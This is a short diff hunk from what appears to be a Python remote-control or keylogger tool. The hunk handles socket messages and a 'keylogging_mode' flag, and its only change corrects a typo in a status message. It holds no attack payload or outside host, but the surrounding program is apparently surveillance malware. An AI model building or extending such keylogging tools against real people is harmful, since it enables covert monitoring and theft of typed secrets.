@@ -78,7 +78,7 @@ while msg!='quit':
             msg = cs.recv(1024).decode()
             keylogging_mode =0
         elif keylogging_mode ==0:
-            msg = "Keyloggging should be started first"
+            msg = "Keylogging should be started first"
             cs.send(msg.encode())
             msg = cs.recv(1024).decode()
     else:
